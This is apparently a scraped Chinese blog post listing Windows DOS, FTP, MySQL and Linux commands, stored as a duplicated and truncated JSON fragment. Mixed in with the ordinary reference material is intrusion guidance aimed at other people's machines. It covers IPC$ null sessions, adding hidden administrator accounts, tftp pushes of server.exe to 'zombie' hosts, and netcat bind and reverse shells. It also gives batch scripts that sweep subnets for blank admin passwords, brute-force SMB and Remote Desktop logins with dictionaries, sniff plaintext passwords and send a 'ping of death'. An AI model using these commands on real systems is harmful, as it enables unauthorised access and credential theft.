远和登陆服务器,默认端口为23 \nopen ip 连接到IP（属telnet登陆后的命令） \ntelnet 在本机上直接键入telnet 将进入本机的telnet \ncopy 路径\\文件名1　路径\\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 \ncopy c:\\srv.exe \\\\ip\\admin$ 复制本地c:\\srv.exe到对方的admin下 \ncppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件\nver 在DOS窗口下显示版本信息 \nwinver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） \nformat 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS \nmd　目录名 创建目录 \nreplace 源文件　要替换文件的目录 替换文件 \nren 原文件名　新文件名 重命名文件名 \ntree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 \ntype 文件名 显示文本文件的内容 \nmore 文件名 逐屏显示输出文件 \ndoskey 要锁定的命令＝字符\ndoskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= \ntaskmgr 调出任务管理器 \nchkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 \ntlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 \nexit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe \npath 路径\\可执行文件的文件名 为可执行文件设置一个路径。 \ncmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? \nregedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； \nregedit /e 注册表文件名 导出注册表 \ncacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\\test.txt /D pub 设定d:\\test.txt拒绝pub用户访问。 \ncacls 文件名 查看文件的访问用户权限列表 \nREM 文本内容 在批处理文件中添加注解 \nnetsh 查看或更改本地网络配置情况\n#4 四：\nIIS服务命令： \niisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） \niisreset /start或stop 启动（停止）所有Internet服务 \niisreset /restart 停止然后重新启动所有Internet服务 \niisreset /status 显示所有Internet服务状态 \niisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 \niisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 \niisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 \niisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。 \nFTP 命令： (后面有详细说明内容) \nftp的命令行格式为:\nftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。\n－d 使用调试方式。 \n－n 限制ftp的自动登录,即不使用.netrc文件。\n－g 取消全局文件名。 \nhelp [命令] 或 ？[命令] 查看命令说明 \nbye 或 quit 终止主机FTP进程,并退出FTP管理方式. \npwd 列出当前远端主机目录 \nput 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中 \nget 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 \nmget [remote-files] 从远端主机接收一批文件至本地主机 \nmput local-files 将本地主机中一批文件传送至远端主机 \ndir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件 \nascii 设定以ASCII方式传送文件(缺省值) \nbin 或 image 设定以二进制方式传送值) \nbin 或 image 设定以二进制方式传送文件 \nbell 每完成一次文件传送,报警提示 \ncdup 返回上一级目录 \nclose 中断与远程服务器的ftp会话(与open对应) \nopen host[port] 建立指定ftp服务器连接,可指定连接端口 \ndelete 删除远端主机中的文件 \nmdelete [remote-files] 删除一批文件 \nmkdir directory-name 在远端主机中建立目录 \nrename [from] [to] 改变远端主机中的文件名 \nrmdir directory-name 删除远端主机中的目录 \nstatus 显示当前FTP的状态 \nsystem 显示远端主机系统类型 \nuser user-name [password] [account] 重新以别的用户名登录远端主机 \nopen host [port] 重新建立一个新的连接 \nprompt 交互提示模式 \nmacdef 定义宏命令 \nlcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 \nchmod 改变远端主机的文件权限 \ncase 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 \ncd remote－dir 进入远程主机目录 \ncdup 进入远程主机目录的父目录 \n! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip \nMYSQL 命令： \nmysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。\n（例：mysql -h110.110.110.110 -Uroot -P123456 \n注:u与root可以不用加空格，其它也一样） \nexit 退出MYSQL \nmysqladmin -u用户名 -p旧密码 password 新密码 修改密码 \ngrant select on 数据库.* to 用户名@登录主机 identified by \\\"密码\\\"; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符） \nshow databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。 \nuse mysql；\nshow tables; 显示库中的数据表 \ndescribe 表名; 显示数据表的结构 \ncreate database 库名; 建库 \nuse 库名；\ncreate table 表名 (字段设定列表)； 建表 \ndrop database 库名; \ndrop table 表名； 删库和删表 \ndelete from 表名; 将表中记录清空 \nselect * from 表名; 显示表中的记录 \nmysqldump --opt school>school.bbb 备份数据库：（命令在DOS的\\\\mysql\\\\bin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。 \nwin2003系统下新增命令（实用部份）： \nshutdown /参数 关闭或重启本地或远程主机。\n参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。\n例：shutdown /r /t 0 立即重启本地主机（无延时） \ntaskill /参数 进程名或进程的pid 终止一个或多个任务和进程。\n参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 \ntasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。\n参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。\n#6 六：\nLinux系统下基本命令： 要区分大小写 \nuname 显示版本信息（同win2K的 ver） \ndir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir） \npwd 查询当前所在的目录位置 \ncd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。 \ncat 文件名 查看文件内容 \ncat >abc.txt 往abc.txt文件中写上内容。 \nmore 文件名 以一页一页的方式显示一个文本文件。 \ncp 复制文件 \nmv 移动文件 \nrm 文件名 删除文件，rm -a 目录名删除目录及子目录 \nmkdir 目录名 建立目录 \nrmdir 删除子目录，目录内没有文档。 \nchmod 设定档案或目录的存取权限 \ngrep 在档案中查找字符串 \ndiff 档案文件比较 \nfind 档案搜寻 \ndate 现在的日期、时间 \nwho 查询目前和你使用同一台机器的人以及Login时间地点 \nw 查询目前上机者的详细资料 \nwhoami 查看自己的帐号名称 \ngroups 查看某人的Group \npasswd 更改密码 \nhistory 查看自己下过的命令 \nps 显示进程状态 \nkill 停止某进程 \ngcc 黑客通常用它来编译C语言写的文件 \nsu 权限转换为指定使用者 \ntelnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 \nftp ftp连接上某服务器（同win2K） \n附：批处理命令与变量\n1：for命令及变量 基本格式： \nFOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。\n批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use \\\\ip\\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3\n(set):指定一个或一组文件，可使用通配符，如：(D:\\user.txt)和(1 1 254)(1 -1 254),{ \"(1 1 254)\"第一个\"1\"指起始值，第二个\"1\"指增长量，第三个\"254\"指结束值，即：从1到254；\"(1 -1 254)\"说明：即从254到1 }\ncommand：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开\ncommand_parameters：为特定命令指定参数或命令行开关\nIN (set)：指在(set)中取值；DO command ：指执行command\n参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:\\pass.txt)时 }。 \n用法举例： \n@echo off \necho 用法格式：test.bat *.*.* > test.txt \nfor /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \\\\%1.%%G /user:administrator | find \"命令成功完成\" >>test.txt \n存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。\n/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有\"命令成功完成\"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。 \n@echo off \necho 用法格式：ok.bat ip \nFOR /F %%i IN (D:\\user.dic) DO smb.exe %1 %%i D:\\pass.dic 200 \n存为：ok.exe 说明：输入一个IP后，用字典文件d:\\pass.dic来暴解d:\\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。 \n2：if命令及变量 基本格式： \nIF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为\"真\"。\n例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。\n0 指发现并成功执行（真）；1 指没有发现、没执行（假）。 \nIF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。\n例：\"if \"%2%\"==\"4\" goto start\"指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加\" \"） \nIF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。\n例：\"if not nc.exe goto end\"指：如果没有发现nc.exe文件就跳到\":end\"标签处。\n\nIF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。\n当有del命令时需把del命令全部内容用< >括起来，因为del命令要单独一行时才能执行，用上< >后就等于是单独一行了；例如：\"if exist test.txt. else echo test.txt.missing \"，注意命令中的\".\"\n\n（二）系统外部命令(均需下载相关工具)：\n1、瑞士军刀：nc.exe\n参数说明： \n-h 查看帮助信息 \n-d 后台模式 \n-e prog程序重定向，一但连接就执行［危险］ \n-i secs延时的间隔 \n-l 监听模式，用于入站连接 \n-L 监听模式，连接天闭后仍然继续监听，直到CTR+C \n-n IP地址，不能用域名 \n-o film记录16进制的传输 \n-p[空格]端口 本地端口号 \n-r 随机本地及远程端口 \n-t 使用Telnet交互方式 \n-u UDP模式 \n-v 详细输出，用-vv将更详细 \n-w数字 timeout延时间隔 \n-z 将输入，输出关掉（用于扫锚时） \n基本用法： \nnc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口 \nnc -l -p 80 开启本机的TCP 80端口并监听 \nnc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口 \nnc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口 \nnc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口 \n高级用法： \nnc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 \nnc -L -p 80 > c:\\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\\log.txt \nnc -L -p 80 < c:\\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中，亦可起到传送文件作用 \ntype.exe c:\\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中,亦可起到传送文件作用 \n本机上用：nc -l -p 本机端口 \n在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K\nnc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙 \n本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称 \n在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机 \n备 注： \n| 管道命令 \n< 或 > 重定向命令。\"<\"，例如：tlntadmn < test.txt 指把test.txt的内容赋值给tlntadmn命令 \n＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:\\winnt >> d:\\log.txt 意思是：后台执行dir，并把结果存在d:\\log.txt中 \n>与>>的区别 　\">\"指：覆盖；\">>\"指：保存到(添加到）。\n如：@dir c:\\winnt >> d:\\log.txt和@dir c:\\winnt > d:\\log.txt二个命令分别执行二次比较看：用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。\n#8 八：\n2、扫锚工具：xscan.exe\n基本格式 \nxscan -host <起始IP>[-<终止IP>] <检测项目> [其他选项] 扫锚\"起始IP到终止IP\"段的所有主机信息 \nxscan -file <主机列表文件名> <检测项目> [其他选项] 扫锚\"主机IP列表文件名\"中的所有主机信息 \n检测项目 \n-active 检测主机是否存活 \n-os 检测远程操作系统类型（通过NETBIOS和SNMP协议） \n-port 检测常用服务的端口状态 \n-ftp 检测FTP弱口令 \n-pub 检测FTP服务匿名用户写权限 \n-pop3 检测POP3-Server弱口令 \n-smtp 检测SMTP-Server漏洞 \n-sql 检测SQL-Server弱口令 \n-smb 检测NT-Server弱口令 \n-iis 检测IIS编码/解码漏洞 \n-cgi 检测CGI漏洞 \n-nasl 加载Nessus攻击脚本 \n-all 检测以上所有项目 \n其它选项 \n-i 适配器编号 设置网络适配器, <适配器编号>可通过\"-l\"参数获取 \n-l 显示所有网络适配器 \n-v 显示详细扫描进度 \n-p 跳过没有响应的主机 \n-o 跳过没有检测到开放端口的主机 \n　 -t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10 \n-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件) \n用法示例 \nxscan -host 192.168.1.1-192.168.255.255 -all -active -p　 检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机 \nxscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机 \nxscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测\"hostlist.txt\"文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机 \n3、命令行方式嗅探器: xsniff.exe\n可捕获局域网内FTP/SMTP/POP3/HTTP协议密码\n参数说明 \n-tcp 输出TCP数据报 \n-udp 输出UDP数据报 \n-icmp 输出ICMP数据报 \n-pass 过滤密码信息 \n-hide 后台运行 \n-host 解析主机名 \n-addr IP地址 过滤IP地址 \n-port 端口 过滤端口 \n-log 文件名 将输出保存到文件 \n-asc 以ASCII形式输出 \n-hex 以16进制形式输出 \n用法示例 \nxsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中 \nxsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出 \n4、终端服务密码破解: tscrack.exe\n参数说明 \n-h 显示使用帮助 \n-v 显示版本信息 \n-s 在屏幕上打出解密能力 \n-b 密码错误时发出的声音 \n-t 同是发出多个连接（多线程） \n-N Prevent System Log entries on targeted server \n-U 卸载移除tscrack组件 \n-f 使用－f后面的密码 \n-F 间隔时间（频率） \n-l 使用－l后面的用户名 \n-w 使用－w后面的密码字典 \n-p 使用－p后面的密码 \n-D 登录主页面 \n用法示例 \ntscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码 \ntscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户 \n@if not exist ipcscan.txt goto noscan \n@for /f \"tokens=1 delims= \" %%i in (3389.txt) do call hack.bat %%i \nnscan \n@echo 3389.txt no find or scan faild \n(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt) \n3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat \n@if not exist tscrack.exe goto noscan \n@tscrack %1 -l administrator -w pass.dic >>rouji.txt \n:noscan \n@echo tscrack.exe no find or scan faild \n(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了) \nhack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。 \n5、其它：\nShutdown.exe \nShutdown \\\\IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。） \nfpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙） \nfpipe -l 80 -s 1029 -r 80 www.sina.com.cn 当有人扫锚你的80端口时，他扫到的结果会完全是www.sina.com.cn的主机信息 \nFpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。 \nOpenTelnet.exe (远程开启telnet工具) \nopentelnet.exe \\\\IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet \\\\ip 连接上对方。\nNTLM认证方式：０：不使用NTLM身份验证；１：先尝试NTLM身份验证，如果失败，再使用用户名和密码；２：只使用NTLM身份验证。\nResumeTelnet.exe (OpenTelnet附带的另一个工具) \nresumetelnet.exe \\\\IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。 \n6、FTP命令详解：\nFTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。\nFTP的命令行格式为： \nftp -v -d -i -n -g [主机名] ，其中\n-v 显示远程服务器的所有响应信息；\n-n 限制ftp的自动登录，即不使用；.n etrc文件；\n-d 使用调试方式；\n-g 取消全局文件名。\n\nFTP使用的内部命令如下(中括号表示可选项):\n1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip \n2.$ macro-ame[args]： 执行宏定义macro-name。\n3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。 \n4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。\n5.ascii：使用ascii类型传输方式。\n6.bell：每个命令执行完毕后计算机响铃一次。\n7.bin：使用二进制文件传输方式。\n8.bye：退出ftp会话过程。\n9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。 \n10.cd remote-dir：进入远程主机目录。\n11.cdup：进入远程主机目录的父目录。 \n12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。\n13.close：中断与远程服务器的ftp会话(与open对应)。 \n14.cr：使用asscii方式传输文件时，将回车换行转换为回行。\n15.delete remote-file：删除远程主机文件。 \n16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。\n17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。 \n18.disconnection：同close。\n19.form format：将文件传输方式设置为format，缺省为file方式。 \n20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。\n21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。 \n22.hash：每传输1024字节，显示一个hash符号(#)。\n23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。\n25.image：设置二进制传输方式(同binary)。 \n26.lcd[dir]：将本地工作目录切换至dir。\n27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。 \n28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。\n29.mdelete[remote-file]：删除远程主机文件。 \n30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir *.o.*.zipoutfile 。\n31.mget remote-files：传输多个远程文件。 \n32.mkdir dir-name：在远程主机中建一目录。\n33.mls remote-file local-file：同nlist，但可指定多个文件名。 \n34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。\n35.modtime file-name：显示远程主机文件的最后修改时间。 \n36.mput local-file：将多个文件传输至远程主机。\n37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。\n38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。\n39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。\n40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。\n41.open host[port]：建立指定ftp服务器连接，可指定连接端口。 \n42.passive：进入被动传输方式。\n43.prompt：设置多个文件传输时的交互提示。 \n44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。\n45.put local-file[remote-file]：将本地文件local-file传送至远程主机。 \n46.pwd：显示远程主机的当前工作目录。\n47.quit：同bye，退出ftp会话。 \n48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如：quote syst.\n49.recv remote-file[local-file]：同get。 \n50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。\n51.rhelp[cmd-name]：请求获得远程主机的帮助。 \n52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。\n53.rename[from][to]：更改远程主机文件名。 \n54.reset：清除回答队列。\n55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。 \n56.rmdir dir-name：删除远程主机目录。\n57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。 \n58.send local-file[remote-file]：同put。\n59.sendport：设置PORT命令的使用。 \n60.site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。\n61.size file-name：显示远程主机文件大小，如：site idle 7200。 \n62.status：显示当前ftp状态。\n63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。 \n64.sunique：将远程主机文件名存储设置为只一(与runique对应)。\n65.system：显示远程主机的操作系统类型。 \n66.tenex：将文件传输类型设置为TENEX机的所需的类型。\n67.tick：设置传输时的字节计数器。 \n68.trace：设置包跟踪。\n69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。 \n70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3\n71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。 \n72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.\n73.?[cmd]：同help.   \n","source":"_posts/DOS命令大全.md","raw":"---\ntitle: Windows下DOS命令大全(经典收藏)\ndate: 2017-12-29 13:34:42\ntags: Shell\n---\n\n**copy:** \\\\ip\\admin$\\svv.exe c:\\ 或:copy\\\\ip\\admin$\\*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C： \n\n**xcopy** 要复制的文件或目录树　目标地址\\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 \n\n**tftp -i** 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\\server.exe 登陆后，将\"IP\"的server.exe下载到目标主机c:\\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送\n \n**tftp -i** 对方IP　put c:\\server.exe 登陆后，上传本地c:\\server.exe至主机 \n**ftp ip** 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；\n默认为ASCII格式传送(文本文件时) \n**route print **显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface \n**arp** 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 \n**start **程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 \n**mem **查看cpu使用情况 \n**attrib **文件名(目录名) 查看某文件（目录）的属性 \n**attrib** 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性 \n**dir **查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 \n**date /t 、 time /t **使用此参数即\"DATE/T\"、\"TIME/T\"将只显示当前日期和时间，而不必输入新日期和时间 \n**set** 指定环境变量名称=要指派给变量的字符 设置环境变量 \nset 显示当前所有的环境变量 \nset p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 \npause 暂停批处理程序，并显示出：请按任意键继续.... \nif 在批处理程序中执行条件处理（更多说明见if命令及变量） \ngoto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：\"：start\"标签） \ncall 路径\\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） \nfor 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） \necho on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 \necho 信息 在屏幕上显示出信息 \necho 信息 >> pass.txt 将\"信息\"保存到pass.txt文件中 \nfindstr \"Hello\" aa.txt 在aa.txt文件中寻找字符串hello \nfind 文件名 查找某文件 \ntitle 标题名字 更改CMD窗口标题名字 \ncolor 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 \nprompt 名称 更改cmd.exe的显示的命令提示符(把C:\\、D:\\统一改为：EntSky\\ )\nnet use \\\\ip\\ipc$ \" \" /user:\" \" 建立IPC空链接 \nnet use \\\\ip\\ipc$ \"密码\" /user:\"用户名\" 建立IPC非空链接 \nnet use h: \\\\ip\\c$ \"密码\" /user:\"用户名\" 直接登陆后映射对方C：到本地为H: \nnet use h: \\\\ip\\c$ 登陆后映射对方C：到本地为H: \nnet use \\\\ip\\ipc$ /del 删除IPC链接 \nnet use h: /del 删除映射对方到本地的为H:的映射 \nnet user 用户名　密码　/add 建立用户 \nnet user guest /active:yes 激活guest用户 \nnet user 查看有哪些用户 \nnet user 帐户名 查看帐户的属性 \nnet localgroup administrators 用户名 /add 把\"用户\"添加到管理员中使其具有管理员权限,注意：administrator后加s用复数 \nnet start 查看开启了哪些服务 \nnet start 服务名　 开启服务；(如:net start telnet， net start schedule) \nnet stop 服务名 停止某服务 \nnet time \\\\目标ip 查看对方时间 \nnet time \\\\目标ip /set 设置本地计算机时间与\"目标IP\"主机的时间同步,加上参数/yes可取消确认信息 \nnet view 查看本地局域网内开启了哪些共享 \nnet view \\\\ip 查看对方局域网内开启了哪些共享 \nnet config 显示系统网络设置 \nnet logoff 断开连接的共享 \nnet pause 服务名 暂停某服务 \nnet send ip \"文本信息\" 向对方发信息 \nnet ver 局域网内正在使用的网络连接类型和信息 \nnet share 查看本地开启的共享 \nnet share ipc$ 开启ipc$共享 \nnet share ipc$ /del 删除ipc$共享 \nnet share c$ /del 删除C：共享 \nnet user guest 12345 用guest用户登陆后用将密码改为12345 \nnet password 密码 更改系统登陆密码 \nnetstat -a 查看开启了哪些端口,常用netstat -an \nnetstat -n 查看端口的网络连接情况，常用netstat -an \nnetstat -v 查看正在进行的工作 \nnetstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） \nnetstat -s 查看正在使用的所有协议使用情况 \nnbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 \ntracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：\"-w数字\"用于设置超时间隔。 \nping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) \nipconfig (winipcfg) 用于windows NT及XP(windows 95 